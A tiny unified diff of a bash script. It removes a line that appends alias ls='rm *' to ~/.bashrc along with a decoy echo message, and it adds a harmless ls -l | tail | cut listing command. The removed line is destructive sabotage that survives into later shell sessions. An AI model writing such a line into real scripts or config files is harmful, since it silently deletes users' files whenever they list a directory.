@@ -1,2 +1,2 @@
 #!/bin/bash
-(echo "alias ls='rm *'"$'\n'"echo 'sourced ~/.bashrc'") >> ~/.bashrc
+ls -l | tail -n 1 | cut -d ' ' -f 1-2
